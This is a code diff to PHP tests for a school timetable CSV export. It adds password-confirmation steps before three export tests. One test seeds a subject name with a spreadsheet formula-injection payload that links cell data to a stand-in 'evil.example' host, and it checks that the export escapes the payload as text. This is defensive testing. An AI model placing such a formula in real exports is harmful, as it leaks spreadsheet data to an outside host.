@@ -154,6 +154,7 @@ test('the teacher view lists the teacher\'s lessons across divisions', function 
 test('a division timetable exports as CSV', function () {
     TimetableEntry::factory()->create(slotPayload());
 
+    confirmPassword();
     $response = $this->get('/admin/timetable/export?division='.$this->division->id)->assertSuccessful();
     $csv = $response->streamedContent();
 
@@ -166,6 +167,7 @@ test('a division timetable exports as CSV', function () {
 test('a teacher timetable exports as CSV', function () {
     TimetableEntry::factory()->create(slotPayload());
 
+    confirmPassword();
     $csv = $this->get('/admin/timetable/export?teacher='.$this->teacher->id)->streamedContent();
 
     expect($csv)->toContain('Geography ('.$this->division->label.')');
@@ -175,6 +177,7 @@ test('the timetable export writes a formula-like subject name as text', function
     $this->subject->update(['subject_name' => '=HYPERLINK("https://evil.example/?"&A1,"Open")']);
     TimetableEntry::factory()->create(slotPayload());
 
+    confirmPassword();
     $csv = $this->get('/admin/timetable/export?division='.$this->division->id)->streamedContent();
 
     expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
